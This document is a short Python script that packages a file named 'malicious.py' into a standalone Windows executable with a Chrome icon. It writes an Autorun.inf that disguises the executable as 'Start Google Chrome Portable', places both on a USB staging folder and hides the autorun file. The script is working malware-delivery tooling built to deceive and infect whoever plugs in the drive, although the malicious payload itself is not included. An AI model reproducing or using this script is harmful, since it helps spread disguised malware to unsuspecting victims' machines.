import PyInstaller.__main__
import shutil 
import os

filename= "malicious.py" 
exename = "rhino.exe" 
icon = "chrome.ico"
pwd = os.getcwd ()
usbdir = os.path.join (pwd, "USB")

if os.path.isfile (exename):
  os.remove (exename)

if os.path.exists("__pycache__"):
    shutil.rmtree("__pycache__")

PyInstaller.__main__.run([
  "malicious.py", 
  "--onefile", 
  "--clean",
  "--log-level=ERROR", 
  "--name="+exename, 
  "--icon="+icon
])

shutil.move (os.path.join(pwd, "dist", exename), pwd) 
shutil.rmtree ("dist")
shutil.rmtree ("build")
os.remove (exename+".spec")

with open("Autorun.inf", "w") as o:
  o.write(" (Autorun) \n") 
  o.write("Open="+exename+"\n")
  o.write("Action=Start Google Chrome Portable\n")
  o.write("Label=My USB\n")
  o.write("Icon="+exename+"\n")

shutil.move (exename, usbdir)
shutil.move ("Autorun.inf",usbdir)
print("attrib +h "+os.path.join(usbdir,"Autorun.inf"))
os.system("attrib +h "+os.path.join(usbdir,"Autorun.inf"))
